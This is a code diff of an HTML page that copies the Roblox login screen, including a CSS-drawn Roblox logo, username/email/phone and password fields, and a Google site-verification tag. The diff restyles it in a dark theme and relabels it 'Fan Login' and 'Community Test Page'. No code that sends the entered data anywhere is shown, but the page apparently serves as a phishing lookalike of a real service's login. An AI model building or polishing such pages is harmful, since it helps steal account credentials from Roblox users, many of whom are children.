@@ -4,10 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="google" content="notranslate">
-    <!-- Новый тег Google Search Console -->
     <meta name="google-site-verification" content="14_6MaRkl6897cOresLaaurQ1t_HU2o4XrzQ2M46aAE" />
-    <title>Roblox</title>
-    <!-- Подключаем шрифт Montserrat, похожий на Roblox -->
+    <title>Roblox - Fan Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">
     <style>
         * {
@@ -18,54 +16,64 @@
         }
 
         body {
-            background-color: #ffffff;
+            background-color: #121214; /* Стильный темный фон */
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            color: #111;
+            color: #fff;
         }
 
         .container {
             width: 100%;
             max-width: 400px;
-            padding: 24px;
+            padding: 32px 24px;
+            background: #1e1e24; /* Карточка формы входа */
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        /* Идеально выровненный логотип на одной линии */
         .logo {
             display: flex;
             align-items: center;
             font-family: 'Montserrat', sans-serif;
-            font-size: 36px;
+            font-size: 32px;
             font-weight: 900;
             letter-spacing: 2px;
-            margin-bottom: 32px;
-            color: #000;
+            margin-bottom: 8px;
+            color: #fff;
             line-height: 1;
         }
 
         .roblox-square-o {
-            width: 28px;
-            height: 28px;
-            background-color: #000;
+            width: 24px;
+            height: 24px;
+            background-color: #fff;
             transform: rotate(23deg);
             display: inline-flex;
             align-items: center;
             justify-content: center;
             margin: 0 5px;
             position: relative;
-            top: 1px; /* Тонкая юстировка по вертикали */
+            top: 1px;
         }
 
         .roblox-square-o-inner {
-            width: 11px;
-            height: 11px;
-            background-color: #ffffff;
+            width: 10px;
+            height: 10px;
+            background-color: #1e1e24;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #9ca3af;
+            margin-bottom: 24px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .input-group {
@@ -78,16 +86,17 @@
             width: 100%;
             padding: 14px 16px;
             font-size: 16px;
-            border: 1px solid #d1d5db;
+            border: 1px solid #374151;
             border-radius: 8px;
             outline: none;
-            background: #f9fafb;
+            background: #2a2a35;
+            color: #fff;
             transition: all 0.2s;
         }
 
         .input-group input:focus {
-            border-color: #000;
-            background: #fff;
+            border-color: #6366f1;
+            background: #1e1e24;
         }
 
         .password-container {
@@ -103,7 +112,7 @@
             background: none;
             border: none;
             cursor: pointer;
-            color: #6b7280;
+            color: #9ca3af;
         }
 
         .login-btn {
@@ -112,7 +121,7 @@
             font-size: 16px;
             font-weight: 600;
             color: #fff;
-            background-color: #000;
+            background-color: #6366f1; /* Измененный акцентный цвет кнопки */
             border: none;
             border-radius: 8px;
             cursor: pointer;
@@ -134,9 +143,9 @@
             padding: 14px;
             font-size: 16px;
             font-weight: 600;
-            color: #000;
-            background-color: #f3f4f6;
-            border: 1px solid #d1d5db;
+            color: #fff;
+            background-color: #374151;
+            border: none;
             border-radius: 8px;
             cursor: pointer;
             margin-top: 12px;
@@ -149,13 +158,13 @@
         }
 
         .footer-links {
-            margin-top: 32px;
+            margin-top: 24px;
             display: flex;
             gap: 24px;
         }
 
         .footer-links a {
-            color: #6b7280;
+            color: #9ca3af;
             font-size: 14px;
             text-decoration: none;
         }
@@ -171,6 +180,7 @@
         <div class="logo notranslate" translate="no">
             R<div class="roblox-square-o"><div class="roblox-square-o-inner"></div></div>BLOX
         </div>
+        <div class="subtitle">Community Test Page</div>
 
         <div class="input-group">
             <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
